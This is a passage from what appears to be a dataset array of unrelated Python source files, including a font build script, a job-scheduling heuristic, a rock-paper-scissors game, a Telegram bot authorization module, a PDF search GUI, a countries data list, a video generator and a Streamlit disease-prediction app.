glyph.width > 0:\n            width = round(glyph.width / min_width) * min_width\n            width = width > min_width and width or min_width\n            if not width in widths:\n                widths[width] = []\n            widths[width].append(glyph.name)\n\n    drawOverline(font, base, pos, thickness, 500)\n\n    mark = ast.FeatureBlock(\"mark\")\n    overset = ast.GlyphClassDefinition(\"OverSet\", ast.GlyphClass([base]))\n    lookup_flags = ast.LookupFlagStatement(markFilteringSet=ast.GlyphClassName(overset))\n    mark.statements.extend([overset, lookup_flags])\n\n    for width in sorted(widths.keys()):\n        # for each width group we create an over/underline glyph with the same\n        # width, and add a contextual substitution lookup to use it when an\n        # over/underline follows any glyph in this group\n        replace = f\"overlinecomb.{width}\"\n        drawOverline(font, replace, pos, thickness, width)\n        sub = ast.SingleSubstStatement(\n            [ast.GlyphName(base)],\n            [ast.GlyphName(replace)],\n            [ast.GlyphClass(widths[width])],\n            [],\n            False,\n        )\n        font.lib[\"public.openTypeCategories\"][replace] = \"mark\"\n        mark.statements.append(sub)\n\n    font.features.text += str(mark)\n\n\nif __name__ == \"__main__\":\n    import argparse\n    from ufoLib2 import Font\n\n    parser = argparse.ArgumentParser(description=\"Build Amiri fonts.\")\n    parser.add_argument(\n        \"--input\", metavar=\"FILE\", required=True, help=\"input font to process\"\n    )\n    parser.add_argument(\n        \"--output\", metavar=\"FILE\", required=True, help=\"output font to write\"\n    )\n    parser.add_argument(\"--version\", type=str, required=True, help=\"font version\")\n\n    args = parser.parse_args()\n\n    font = Font.open(args.input)\n    otf = generateFont(font, args)\n    otf.save(args.output)\n",
    "import random\nimport numpy as np\nimport copy\n\nclass Task:\n    def __init__(self, dealine: int, time: int, profit: int | float) -> None:\n        self.deadline = dealine\n        self.time = time\n        self.profit = profit\n\n    def __repr__(self) -> str:\n        return f\"|{self.deadline}, {self.time}, {self.profit:.2f}|\"\n\nclass Problem:\n    def __init__(self, tasks: list[Task], worker_count: int, deadline: int) -> None:\n        self.tasks = tasks\n        self.worker_count = worker_count\n        self.deadline = deadline\n        self.used_problems = [False for _ in range(len(tasks))]\n        self.solution_matrix = np.zeros((worker_count, len(tasks), deadline))\n        self.profit = 0\n\n    def __repr__(self) -> str:\n        rep = f\"{self.worker_count} workers \\n {self.dealine} absolute dealine \\n {len(tasks)} tasks \\n\"\n        for task in tasks:\n            rep += f\"{str(task)}, \"\n        return rep\n    \ndef generateTasks(count:int, work_dealine: int, maxprofit: int | float) -> list[Task]:\n    tasks = []\n    for _ in range(count):\n        deadline, profit = random.randint(1, work_dealine), random.random() * maxprofit\n        time = max(deadline - random.randint(0, deadline), 1)\n        tasks.append(Task(deadline, time, profit))\n\n    return tasks\n\ndef generateRandom(tasks: list[Task], worker_count: int, deadline: int, worker_tries: int) -> Problem:\n    '''\n    Generates random solution. For each task it tries to fit it randomly into any worker's timeline ``worker_tries`` times.\n    Upon failure of fitting task, skips to next task.\n    '''\n\n    problem = Problem(tasks, worker_count, deadline)\n    matrix = problem.solution_matrix\n    workers_timeline = np.zeros((worker_count, deadline))\n\n    # for each task\n    for task_idx, task in enumerate(tasks):\n        \n        # generate random start time for each task in the interval <0, deadline - time> and try to fit it into any agent\n        for worker in range(worker_count):\n\n            break_worker = False\n            \n            # how many times we will try to fit the task to each worker\n            for _ in range(worker_tries):\n                \n                # select random time\n                start = random.randint(0, task.deadline - task.time)\n                can_fit_task = True\n\n                # if worker is busy during this time\n                if np.any(workers_timeline[worker, start : start + task.time]):\n                    can_fit_task = False\n\n                # if we can fit this task\n                if can_fit_task:\n\n                    problem.used_problems[task_idx] = True\n                    workers_timeline[worker, start : start + task.time] = 1\n                    matrix[worker, task_idx, start] = 1\n                    break_worker = True\n                    problem.profit += task.profit\n\n                    break\n\n            # if we managed to fit the task we can go to next task\n            if break_worker:\n                break\n    \n    return problem\n\ndef generateBasedPPT(tasks: list[Task], worker_count: int, deadline: int):\n    '''\n    First sort the tasks using ``task.pay / task.time`` metric. After that iterate over tasks and\n    try to fit the task to any worker starting from <dealine - time, deadline> and going down to\n    <deadline - time - 1, deadline - 1> and so on.\n    '''\n\n    tasks.sort(key=lambda x: x.profit/x.time, reverse=True)\n\n    problem = Problem(tasks, worker_count, deadline)\n    matrix = problem.solution_matrix\n    workers_timeline = np.zeros((worker_count, deadline))\n\n    for task_idx, task in enumerate(tasks):\n\n        for worker in range(worker_count):\n\n            break_worker = False\n            start = task.deadline - task.time\n\n            while start >= 0:\n\n                # if the worker is busy try to fit it earlier\n                if np.any(workers_timeline[worker][start : start + task.time]):\n                    start -= 1\n                    continue\n\n                workers_timeline[worker][start : start + task.time] = 1\n                problem.used_problems[task_idx] = True\n                matrix[worker, task_idx, start] = 1\n                problem.profit += task.profit\n                break_worker = True\n\n                break\n\n            \n            if break_worker:\n                break\n    \n    return problem\n\ndef checkSolution(problem: Problem):\n    \n    # check if the task is assigned only once\n    for i in range(len(problem.tasks)):\n        if not 0 <= np.sum(problem.solution_matrix[:, i, :]) <= 1:\n            print(\"Failed at: Check 1\")\n            return False\n        \n    # check if the the task is assigned before its deadline\n    for i in range(len(problem.tasks)):\n        for j in range(problem.worker_count):\n\n            idx = np.where(problem.solution_matrix[j, i] == 1)\n            if len(idx[0]) >= 1:\n                time_start = idx[0][0]\n                if time_start + problem.tasks[i].time > problem.tasks[i].deadline:\n                    print(\"Failed at: Check 2\")\n                    re",
    "import random\n\nrock = '''\n    _______\n---'   ____)\n      (_____)\n      (_____)\n      (____)\n---.__(___)\n'''\n\npaper = '''\n    _______\n---'   ____)____\n          ______)\n          _______)\n         _______)\n---.__________)\n'''\n\nscissors = '''\n    _______\n---'   ____)____\n          ______)\n       __________)\n      (____)\n---.__(___)\n'''\n\ngame_images = [rock, paper, scissors]\n\nuser_choice = int(input(\"What do you choose? Type 0 for Rock, 1 for Paper or 2 for Scissors.\\n\"))\nprint(game_images[user_choice])\n\ncomputer_choice = random.randint(0, 2)\nprint(\"Computer chose:\")\nprint(game_images[computer_choice])\n\nif user_choice >= 3 or user_choice < 0: \n  print(\"You typed an invalid number, you lose!\") \nelif user_choice == 0 and computer_choice == 2:\n  print(\"You win!\")\nelif computer_choice == 0 and user_choice == 2:\n  print(\"You lose\")\nelif computer_choice > user_choice:\n  print(\"You lose\")\nelif user_choice > computer_choice:\n  print(\"You win!\")\nelif computer_choice == user_choice:\n  print(\"It's a draw\")\n\n",
    "# SPDX-FileCopyrightText: Copyright (c) 2024 lbuque\n#\n# SPDX-License-Identifier: MIT\n\nfrom .basic_device import HABaseDeviceType\nfrom ..utils.serializer import HASerializer\nfrom ..utils.constants import (\n    HAComponentBinarySensor,\n    HANameProperty,\n    HAObjectIdProperty,\n    HADeviceClassProperty,\n    HAIconProperty,\n    HAStateTopic,\n    HAStateOn,\n    HAStateOff,\n)\n\n\nclass HABinarySensor(HABaseDeviceType):\n    def __init__(self, unique_id) -> None:\n        super().__init__(HAComponentBinarySensor, unique_id)\n        self._class = None\n        self._icon = None\n        self._expire_after = 0\n        self._current_state = False\n\n    def set_state(self, state: bool, force=False) -> bool:\n        if force is False and state == self._current_state:\n            return True\n\n        if self._publish_state(state):\n            self._current_state = state\n            return True\n\n        return False\n\n    def set_expire_after(self, expire_after: int) -> None:\n        if expire_after > 0:\n            self._expire_after = expire_after\n        else:\n            self._expire_after = 0\n\n    def set_current_state(self, state: bool) -> None:\n        self._current_state = state\n\n    def get_current_state(self) -> bool:\n        return self._current_state\n\n    def set_device_class(self, class_name: str) -> None:\n        self._class = class_name\n\n    def set_icon(self, icon: str) -> None:\n        self._icon = icon\n\n    def build_serializer(self):\n        if self._serializer is not None or self.unique_id is None:\n            return\n\n        self._serializer = HASerializer(self)\n        self._serializer.set_kv(HANameProperty, self._name)\n        self._serializer.set_kv(HAObjectIdProperty, self._object_id)\n        self._serializer.set_flag(HASerializer.WithUniqueId)\n        self._serializer.set_kv(HADeviceClassProperty, self._class)\n        self._serializer.set_kv(HAIconProperty, self._icon)\n\n        self._serializer.set_flag(HASerializer.WithDevice)\n        self._serializer.set_flag(HASerializer.WithAvailability)\n        self._serializer.set_topic(HAStateTopic)\n\n    def on_mqtt_connected(self):\n        if self.unique_id is None:\n            return\n\n        print(\"MHA: HABinarySensor on_mqtt_connected\")\n\n        self.publish_config()\n        self.publish_availability()\n        self._publish_state(self._current_state)\n\n    def _publish_state(self, state) -> bool:\n        return self.publish_on_data_topic(HAStateTopic, HAStateOn if state else HAStateOff)\n",
    "from pyrogram import filters\nfrom pyrogram.types import Message\n\nimport config\nfrom strings import get_command\nfrom KittuXv import app\nfrom KittuXv.misc import SUDOERS\nfrom KittuXv.utils.database import (add_private_chat,\n                                       get_private_served_chats,\n                                       is_served_private_chat,\n                                       remove_private_chat)\nfrom KittuXv.utils.decorators.language import language\n\nAUTHORIZE_COMMAND = get_command(\"AUTHORIZE_COMMAND\")\nUNAUTHORIZE_COMMAND = get_command(\"UNAUTHORIZE_COMMAND\")\nAUTHORIZED_COMMAND = get_command(\"AUTHORIZED_COMMAND\")\n\n\n@app.on_message(filters.command(AUTHORIZE_COMMAND) & SUDOERS)\n@language\nasync def authorize(client, message: Message, _):\n    if config.PRIVATE_BOT_MODE != str(True):\n        return await message.reply_text(_[\"pbot_12\"])\n    if len(message.command) != 2:\n        return await message.reply_text(_[\"pbot_1\"])\n    try:\n        chat_id = int(message.text.strip().split()[1])\n    except:\n        return await message.reply_text(_[\"pbot_7\"])\n    if not await is_served_private_chat(chat_id):\n        await add_private_chat(chat_id)\n        await message.reply_text(_[\"pbot_3\"])\n    else:\n        await message.reply_text(_[\"pbot_5\"])\n\n\n@app.on_message(filters.command(UNAUTHORIZE_COMMAND) & SUDOERS)\n@language\nasync def unauthorize(client, message: Message, _):\n    if config.PRIVATE_BOT_MODE != str(True):\n        return await message.reply_text(_[\"pbot_12\"])\n    if len(message.command) != 2:\n        return await message.reply_text(_[\"pbot_2\"])\n    try:\n        chat_id = int(message.text.strip().split()[1])\n    except:\n        return await message.reply_text(_[\"pbot_7\"])\n    if not await is_served_private_chat(chat_id):\n        return await message.reply_text(_[\"pbot_6\"])\n    else:\n        await remove_private_chat(chat_id)\n        return await message.reply_text(_[\"pbot_4\"])\n\n\n@app.on_message(filters.command(AUTHORIZED_COMMAND) & SUDOERS)\n@language\nasync def authorized(client, message: Message, _):\n    if config.PRIVATE_BOT_MODE != str(True):\n        return await message.reply_text(_[\"pbot_12\"])\n    m = await message.reply_text(_[\"pbot_8\"])\n    served_chats = []\n    text = _[\"pbot_9\"]\n    chats = await get_private_served_chats()\n    for chat in chats:\n        served_chats.append(int(chat[\"chat_id\"]))\n    count = 0\n    co = 0\n    msg = _[\"pbot_13\"]\n    for served_chat in served_chats:\n        try:\n            title = (await app.get_chat(served_chat)).title\n            count += 1\n            text += f\"{count}:- {title[:15]} [{served_chat}]\\n\"\n        except Exception:\n            title = _[\"pbot_10\"]\n            co += 1\n            msg += f\"{co}:- {title} [{served_chat}]\\n\"\n    if co == 0:\n        if count == 0:\n            return await m.edit(_[\"pbot_11\"])\n        else:\n            return await m.edit(text)\n    else:\n        if count == 0:\n            await m.edit(msg)\n        else:\n            text = f\"{text} {msg}\"\n            return await m.edit(text)\n",
    "import fitz\r\nfrom tkinter import *\r\nimport tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import filedialog\r\n\r\n\r\ndef open_file():\r\n    filepath = filedialog.askopenfilename()\r\n    if filepath == \"\":\r\n        return\r\n    search_term = text_input.get()\r\n    pdf = fitz.open(filepath)\r\n    for current_page in range(len(pdf)):\r\n        page = pdf.load_page(current_page)\r\n\r\n        if page.search_for(search_term):\r\n            page_text = page.get_text()\r\n            for i in page_text.split('\\t'):\r\n                if search_term in i:\r\n                    with open(f\"{name_input.get()}.txt\", \"a\") as file:\r\n                        file.write(f\"\\n\\n{i}\")\r\n\r\n\r\ndef save_file():\r\n    filepath = filedialog.asksaveasfilename()\r\n    if filepath != \"\":\r\n        text = text_editor.get(\"1.0\", END)\r\n        with open(filepath, \"w\") as file:\r\n            file.write(text)\r\n\r\n\r\nwindow = tk.Tk()\r\n\r\nwindow.resizable(width=True, height=True)\r\n\r\nwindow.title(\"\u041f\u043e\u0438\u0441\u043a \u0430\u0431\u0437\u0430\u0446\u0435\u0432 \u0441 \u043d\u0443\u0436\u043d\u044b\u043c \u0441\u043b\u043e\u0432\u043e\u043c\")\r\n\r\nwindow.geometry('720x360')\r\n\r\nsearch_text = tk.Label(window, text=\"\u0421\u044e\u0434\u0430 \u0432\u0432\u0435\u0434\u0438 \u0441\u043b\u043e\u0432\u043e \u0434\u043b\u044f \u043f\u043e\u0438\u0441\u043a\u0430\", font=(\"Arial Bald\", 16), fg=\"black\")\r\nsearch_text.place(x=180, y=25)\r\n\r\ntext_input = tk.Entry(width=47)\r\ntext_input.place(x=180, y=65)\r\n\r\nname_text = tk.Label(window, text=\"\u041f\u0440\u0438\u0434\u0443\u043c\u0430\u0439 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0434\u043b\u044f \u0444\u0430\u0439\u043b\u0430\", font=(\"Arial Bald\", 16), fg=\"black\")\r\nname_text.place(x=180, y=200)\r\n\r\nname_input = tk.Entry(width=47)\r\nname_input.place(x=180, y=250)\r\n\r\nsearch_button = tk.Button(window, text=\"\u041f\u043e\u0438\u0441\u043a\", width=47, height=2, command=open_file)\r\nsearch_button.place(x=180, y=110)\r\n\r\ntext_editor = Text()\r\n\r\n\r\nwindow.mainloop()\r\n",
    "import os\n\nimport google.generativeai as genai\nfrom rich.markdown import Markdown\n\nfrom cyril.config import console\nfrom cyril.operators.abc import OperatorsBase\n\n\nclass GeminiApi(OperatorsBase):\n    \"\"\"Gemini API Operator\"\"\"\n\n    def __init__(self, prompt: list[str], context: str):\n        super().__init__(prompt, context)\n        self.api_key = os.getenv(\"CYRIL_GEMINI\")\n        genai.configure(api_key=self.api_key)\n        self.model = genai.GenerativeModel(\"gemini-pro\")\n        self.chat = self.model.start_chat(\n            history=[\n                {\n                    \"role\": \"user\",\n                    \"parts\": {\n                        \"text\": self.context,\n                    },\n                },\n                {\n                    \"role\": \"model\",\n                    \"parts\": {\"text\": \"Sure! Ask me a question:\"},\n                },\n            ]\n        )\n\n    def call(self, config: dict = None):\n        \"\"\"Call the API\"\"\"\n        response = self.chat.send_message(self.prompt)\n        md = Markdown(response.text)\n        console.print(md)\n",
    "from __future__ import annotations\n\nfrom typing import *  # type: ignore\n\nimport rio\n\nfrom .. import components as comps\n\n\n# <component>\nclass EmptyChatPlaceholder(rio.Component):\n    \"\"\"\n    This component is a placeholder, which is displayed to the user if there is\n    no chat history yet. It greets the user, contains suggestions for the user\n    to start a conversation, as well as a text input for the user to ask\n    anything they have in mind.\n    \"\"\"\n\n    # This will be used for the text input to store its result in\n    user_message_text: str = \"\"\n\n    # This event will be triggered when the user sends a message, be it custom\n    # or one of the suggestions.\n    on_question: rio.EventHandler[str] = None\n\n    async def on_text_input_confirm(self, *_) -> None:\n        \"\"\"\n        Called when the text input is confirmed, or the \"send\" button pressed.\n        The function ensures that the input isn't empty. If that's the case the\n        message is sent on to the `on_question` event.\n        \"\"\"\n        # If the user hasn't typed anything, do nothing\n        message_text = self.user_message_text.strip()\n\n        if not message_text:\n            return\n\n        # Trigger the `on_question` event\n        await self.call_event_handler(self.on_question, message_text)\n\n    def build(self) -> rio.Component:\n        return rio.Column(\n            # Greet the user\n            rio.Text(\n                \"Chat with AI\",\n                style=rio.TextStyle(\n                    font_size=5,\n                    font_weight=\"bold\",\n                    fill=rio.LinearGradientFill(\n                        (self.session.theme.secondary_color, 0),\n                        (self.session.theme.primary_color, 1),\n                    ),\n                ),\n            ),\n            # Explain what the app is all about\n            rio.Text(\n                \"Ask a free-form question and AI will help you on your journey\",\n                margin_top=1,\n            ),\n            # Give the user an opportunity to enter a custom question\n            rio.Row(\n                rio.MultiLineTextInput(\n                    label=\"Ask something...\",\n                    text=self.bind().user_message_text,\n                    on_confirm=self.on_text_input_confirm,\n                    width=\"grow\",\n                    height=5,\n                ),\n                rio.IconButton(\n                    \"material/navigate-next\",\n                    on_press=self.on_text_input_confirm,\n                ),\n                spacing=1,\n                margin_top=1,\n            ),\n            # And also give suggestions for them to start with\n            rio.Text(\n                \"Try asking\",\n                style=\"dim\",\n                margin_top=3,\n            ),\n            rio.Row(\n                comps.ChatSuggestionCard(\n                    \"material/restaurant\",\n                    \"Suggest ways to make a dish more delicious\",\n                    on_press=self.on_question,\n                ),\n                comps.ChatSuggestionCard(\n                    \"material/coffee\",\n                    \"What's the best way to store coffee?\",\n                    on_press=self.on_question,\n                ),\n                comps.ChatSuggestionCard(\n                    \"material/co-present\",\n                    \"Help me improve my presentation technique\",\n                    on_press=self.on_question,\n                ),\n                comps.ChatSuggestionCard(\n                    \"material/work\",\n                    \"Draft a job application email for me\",\n                    on_press=self.on_question,\n                ),\n                spacing=1,\n                margin_top=1,\n            ),\n        )\n\n\n# </component>\n",
    "\n# replace the return statement in models/inbetweener_with_mask_with_spec.py,\n# in InbetweenerTM.forward(), in the else: clause of \"if 'motion0' in data and 'motion1' in data:\",\n# with the return statement below:\n\n            return {\n                'keypoints0t': kpt0t,\n                'keypoints1t': kpt1t,\n                'vb0': (vb0 > 0).float(),\n                'vb1': (vb1 > 0).float(),\n                'r0': motion_output0,\n                'r1': motion_output1,\n                'loss': -1,\n                'skip_train': True,\n            }\n\n# replace the \"tqdm\" loop in DraftRefine.eval with this to run on a given pair of png,json:\n\n            import custom_data\n            import visualize_custom\n            # this works with .png and .json files from the paper's data set - you can replace with your own\n            s0 = custom_data.DataSample('data/ml100_norm/all/frames/chip_abe/Image0001.png', 'data/ml100_norm/all/labels/chip_abe/Line0001.json')\n            s1 = custom_data.DataSample('data/ml100_norm/all/frames/chip_abe/Image0005.png', 'data/ml100_norm/all/labels/chip_abe/Line0005.json')\n            data = custom_data.make_model_input(s0, s1)\n            \n            pred = model(data)\n            for k, v in pred.items():\n                pred[k] = v\n                pred = {**pred, **data}\n\n            img_vis = visualize_custom.visualize_custom(pred)\n            cv2.imwrite('out.png', img_vis)\n\n# now you can run, say, python -u main.py --config configs/cr_inbetweener_full.yaml --eval\n# and get the result of inbetweening between your two inputs in out.png (of course\n# configs/cr_inbetweener_full.yaml is ignored since you replaced the loop going through\n# the dataset specified in this file with inference on your inputs) \n",
    "countries_data = [\n    {\n        \"name\": \"Afghanistan\",\n        \"capital\": \"Kabul\",\n        \"languages\": [\n            \"Pashto\",\n            \"Uzbek\",\n            \"Turkmen\"\n        ],\n        \"population\": 27657145,\n        \"flag\": \"https://restcountries.eu/data/afg.svg\",\n        \"currency\": \"Afghan afghani\"\n    },\n    {\n        \"name\": \"\u00c5land Islands\",\n        \"capital\": \"Mariehamn\",\n        \"languages\": [\n            \"Swedish\"\n        ],\n        \"population\": 28875,\n        \"flag\": \"https://restcountries.eu/data/ala.svg\",\n        \"currency\": \"Euro\"\n    },\n    {\n        \"name\": \"Albania\",\n        \"capital\": \"Tirana\",\n        \"languages\": [\n            \"Albanian\"\n        ],\n        \"population\": 2886026,\n        \"flag\": \"https://restcountries.eu/data/alb.svg\",\n        \"currency\": \"Albanian lek\"\n    },\n    {\n        \"name\": \"Algeria\",\n        \"capital\": \"Algiers\",\n        \"languages\": [\n            \"Arabic\"\n        ],\n        \"population\": 40400000,\n        \"flag\": \"https://restcountries.eu/data/dza.svg\",\n        \"currency\": \"Algerian dinar\"\n    },\n    {\n        \"name\": \"American Samoa\",\n        \"capital\": \"Pago Pago\",\n        \"languages\": [\n            \"English\",\n            \"Samoan\"\n        ],\n        \"population\": 57100,\n        \"flag\": \"https://restcountries.eu/data/asm.svg\",\n        \"currency\": \"United State Dollar\"\n    },\n    {\n        \"name\": \"Andorra\",\n        \"capital\": \"Andorra la Vella\",\n        \"languages\": [\n            \"Catalan\"\n        ],\n        \"population\": 78014,\n        \"flag\": \"https://restcountries.eu/data/and.svg\",\n        \"currency\": \"Euro\"\n    },\n    {\n        \"name\": \"Angola\",\n        \"capital\": \"Luanda\",\n        \"languages\": [\n            \"Portuguese\"\n        ],\n        \"population\": 25868000,\n        \"flag\": \"https://restcountries.eu/data/ago.svg\",\n        \"currency\": \"Angolan kwanza\"\n    },\n    {\n        \"name\": \"Anguilla\",\n        \"capital\": \"The Valley\",\n        \"languages\": [\n            \"English\"\n        ],\n        \"population\": 13452,\n        \"flag\": \"https://restcountries.eu/data/aia.svg\",\n        \"currency\": \"East Caribbean dollar\"\n    },\n    {\n        \"name\": \"Antarctica\",\n        \"capital\": \"\",\n        \"languages\": [\n            \"English\",\n            \"Russian\"\n        ],\n        \"population\": 1000,\n        \"flag\": \"https://restcountries.eu/data/ata.svg\",\n        \"currency\": \"Australian dollar\"\n    },\n    {\n        \"name\": \"Antigua and Barbuda\",\n        \"capital\": \"Saint John's\",\n        \"languages\": [\n            \"English\"\n        ],\n        \"population\": 86295,\n        \"flag\": \"https://restcountries.eu/data/atg.svg\",\n        \"currency\": \"East Caribbean dollar\"\n    },\n    {\n        \"name\": \"Argentina\",\n        \"capital\": \"Buenos Aires\",\n        \"languages\": [\n            \"Spanish\",\n            \"Guaran\u00ed\"\n        ],\n        \"population\": 43590400,\n        \"flag\": \"https://restcountries.eu/data/arg.svg\",\n        \"currency\": \"Argentine peso\"\n    },\n    {\n        \"name\": \"Armenia\",\n        \"capital\": \"Yerevan\",\n        \"languages\": [\n            \"Armenian\",\n            \"Russian\"\n        ],\n        \"population\": 2994400,\n        \"flag\": \"https://restcountries.eu/data/arm.svg\",\n        \"currency\": \"Armenian dram\"\n    },\n    {\n        \"name\": \"Aruba\",\n        \"capital\": \"Oranjestad\",\n        \"languages\": [\n            \"Dutch\",\n            \"(Eastern) Punjabi\"\n        ],\n        \"population\": 107394,\n        \"flag\": \"https://restcountries.eu/data/abw.svg\",\n        \"currency\": \"Aruban florin\"\n    },\n    {\n        \"name\": \"Australia\",\n        \"capital\": \"Canberra\",\n        \"languages\": [\n            \"English\"\n        ],\n        \"population\": 24117360,\n        \"flag\": \"https://restcountries.eu/data/aus.svg\",\n        \"currency\": \"Australian dollar\"\n    },\n    {\n        \"name\": \"Austria\",\n        \"capital\": \"Vienna\",\n        \"languages\": [\n            \"German\"\n        ],\n        \"population\": 8725931,\n        \"flag\": \"https://restcountries.eu/data/aut.svg\",\n        \"currency\": \"Euro\"\n    },\n    {\n        \"name\": \"Azerbaijan\",\n        \"capital\": \"Baku\",\n        \"languages\": [\n            \"Azerbaijani\"\n        ],\n        \"population\": 9730500,\n        \"flag\": \"https://restcountries.eu/data/aze.svg\",\n        \"currency\": \"Azerbaijani manat\"\n    },\n    {\n        \"name\": \"Bahamas\",\n        \"capital\": \"Nassau\",\n        \"languages\": [\n            \"English\"\n        ],\n        \"population\": 378040,\n        \"flag\": \"https://restcountries.eu/data/bhs.svg\",\n        \"currency\": \"Bahamian dollar\"\n    },\n    {\n        \"name\": \"Bahrain\",\n        \"capital\": \"Manama\",\n        \"languages\": [\n            \"Arabic\"\n        ],\n        \"population\": 1404900,\n        \"flag\": \"https://restcountries.eu/data/bhr.svg\",\n        \"currency\": \"Bahraini dinar\"\n    },\n    {\n        \"name\": \"Bangladesh\",\n        \"capital\": \"Dhaka\",\n        \"languages\": [\n            \"Bengali\"\n        ],\n        \"population\": 161006790,\n        \"flag\": \"https://restcountries.eu/data/bgd.svg\",\n        \"currency\": \"Bangladeshi taka\"\n    },\n ",
    "import os\nimport shutil\nimport sys\n\nfrom lib.video_texts import get_names,process_text,getyamll,read_config_file,read_random_line\nfrom lib.image_procces import getim,delete_invalid_images,sortimage,shape_error\nfrom lib.APIss import download_file,chatgpt,translateto\nfrom lib.video_editor import mergevideo\nfrom lib.voices import generate_voice\nfrom lib.language import get_language_code\n\ndef intro(title):\n  introtext = chatgpt(getyamll(\"intro_prompt\").format(title=title,language=read_config_file()[\"language\"]))\n  introtext = process_text(introtext, \":\")\n  print(introtext)\n  try:\n      os.makedirs(\"tempfiles/11\")\n  except FileExistsError:\n      pass  \n  except Exception as e:\n      print(f\"Error: {e}\")\n  generate_voice(introtext, \"tempfiles/11/11.mp3\",get_language_code(read_config_file()[\"language\"]))\n\ndef top10s(top10,genre,title):\n  num = 1\n  for top in top10:\n    imagepath=str(num)\n    npath = \"tempfiles/\" + imagepath\n    mp3file = npath + \"/\" + imagepath + \".mp3\"\n\n    getim(top+\" \"+genre,npath)\n    delete_invalid_images(npath)\n    sortimage(npath)\n    delete_invalid_images(npath)\n    shape_error(npath)\n    sortimage(npath)\n\n    time = int(read_config_file()[\"time\"]) * 60 / 10\n    time = int(time)\n    text = chatgpt(getyamll(\"text_prompt\").format(title=title,top=top,genre=genre,time=str(time),language=read_config_file()[\"language\"]))\n    text = translateto(\"number \" + imagepath +\" \" + top, get_language_code(read_config_file()[\"language\"])) +\",,..\"+ text\n    lines = text.strip().split('\\n')\n    if \"sure\" in lines[0]:\n        lines.pop()\n    if \"assist\" in lines[-1]:\n        lines.pop()\n    text = '\\n'.join(lines)\n\n    print(text)\n\n    generate_voice(text, mp3file,get_language_code(read_config_file()[\"language\"]))\n\n    print(\"--------------------------\")\n    num = num + 1\n\ndef outro():\n  if not os.path.exists(\"tempfiles/0\"):\n      os.mkdir(\"tempfiles/0\")\n  download_file(read_random_line(\"download_list/outro_pic.txt\"), \"tempfiles/0/1.jpg\")\n  generate_voice(translateto(getyamll(\"outro_text\"),get_language_code(read_config_file()[\"language\"])), \"tempfiles/0/0.mp3\",get_language_code(read_config_file()[\"language\"]))\n\n\ndef delete_directories_and_file(start, end, base_directory=\"tempfiles/\"):\n    try:\n        for i in range(start, end + 1):\n            directory_path = os.path.join(base_directory, str(i))\n            if os.path.exists(directory_path) and os.path.isdir(directory_path):\n                shutil.rmtree(directory_path)\n                print(f\"Directory {i} deleted successfully.\")\n            else:\n                print(f\"Directory {i} not found.\")\n\n        song_file_path = os.path.join(base_directory, \"song.mp3\")\n        if os.path.exists(song_file_path) and os.path.isfile(song_file_path):\n            os.remove(song_file_path)\n            print(\"File 'song.mp3' deleted successfully.\")\n        else:\n            print(\"File 'song.mp3' not found.\")\n\n        print(\"All directories and the file 'song.mp3' deleted successfully.\")\n    except Exception as e:\n        print(f\"Error while deleting directories and file: {e}\")\n\ndef making_video(title,genre=\"\"):\n  genre = read_config_file()[\"general_topic\"]\n  print(\"--------------------------\")\n  print(title)\n  print(\"--------------------------\")\n  top10=get_names(title)\n  print(top10)\n  print(\"--------------------------\")\n  intro(title)\n  print(\"--------------------------\")\n  top10s(top10,genre,title)\n  outro()\n\n  download_file(read_random_line(\"download_list/background_music.txt\"), \"tempfiles/song.mp3\")\n  mergevideo(title,\"tempfiles/song.mp3\",top10,title)\n  delete_directories_and_file(0, 11)\n  if os.path.exists(\"temp.txt\"):\n    os.remove(\"temp.txt\")\n  sys.exit()\n",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Sun May 22 11:53:51 2022\r\n\r\n@author: siddhardhan\r\n\"\"\"\r\n\r\nimport pickle\r\nimport streamlit as st\r\nfrom streamlit_option_menu import option_menu\r\n\r\n\r\n# loading the saved models\r\n\r\ndiabetes_model = pickle.load(open('C:/Users/siddhardhan/Desktop/Multiple Disease Prediction System/saved models/diabetes_model.sav', 'rb'))\r\n\r\nheart_disease_model = pickle.load(open('C:/Users/siddhardhan/Desktop/Multiple Disease Prediction System/saved models/heart_disease_model.sav','rb'))\r\n\r\nparkinsons_model = pickle.load(open('C:/Users/siddhardhan/Desktop/Multiple Disease Prediction System/saved models/parkinsons_model.sav', 'rb'))\r\n\r\n\r\n\r\n# sidebar for navigation\r\nwith st.sidebar:\r\n    \r\n    selected = option_menu('Multiple Disease Prediction System',\r\n                          \r\n                          ['Diabetes Prediction',\r\n                           'Heart Disease Prediction',\r\n                           'Parkinsons Prediction'],\r\n                          icons=['activity','heart','person'],\r\n                          default_index=0)\r\n    \r\n    \r\n# Diabetes Prediction Page\r\nif (selected == 'Diabetes Prediction'):\r\n    \r\n    # page title\r\n    st.title('Diabetes Prediction using ML')\r\n    \r\n    \r\n    # getting the input data from the user\r\n    col1, col2, col3 = st.columns(3)\r\n    \r\n    with col1:\r\n        Pregnancies = st.text_input('Number of Pregnancies')\r\n        \r\n    with col2:\r\n        Glucose = st.text_input('Glucose Level')\r\n    \r\n    with col3:\r\n        BloodPressure = st.text_input('Blood Pressure value')\r\n    \r\n    with col1:\r\n        SkinThickness = st.text_input('Skin Thickness value')\r\n    \r\n    with col2:\r\n        Insulin = st.text_input('Insulin Level')\r\n    \r\n    with col3:\r\n        BMI = st.text_input('BMI value')\r\n    \r\n    with col1:\r\n        DiabetesPedigreeFunction = st.text_input('Diabetes Pedigree Function value')\r\n    \r\n    with col2:\r\n        Age = st.text_input('Age of the Person')\r\n    \r\n    \r\n    # code for Prediction\r\n    diab_diagnosis = ''\r\n    \r\n    # creating a button for Prediction\r\n    \r\n    if st.button('Diabetes Test Result'):\r\n        diab_prediction = diabetes_model.predict([[Pregnancies, Glucose, BloodPressure, SkinThickness, Insulin, BMI, DiabetesPedigreeFunction, Age]])\r\n        \r\n        if (diab_prediction[0] == 1):\r\n          diab_diagnosis = 'The person is diabetic'\r\n        else:\r\n          diab_diagnosis = 'The person is not diabetic'\r\n        \r\n    st.success(diab_diagnosis)\r\n\r\n\r\n\r\n\r\n# Heart Disease Prediction Page\r\nif (selected == 'Heart Disease Prediction'):\r\n    \r\n    # page title\r\n    st.title('Heart Disease Prediction using ML')\r\n    \r\n    col1, col2, col3 = st.columns(3)\r\n    \r\n    with col1:\r\n        age = st.text_input('Age')\r\n        \r\n    with col2:\r\n        sex = st.text_input('Sex')\r\n        \r\n    with col3:\r\n        cp = st.text_input('Chest Pain types')\r\n        \r\n    with 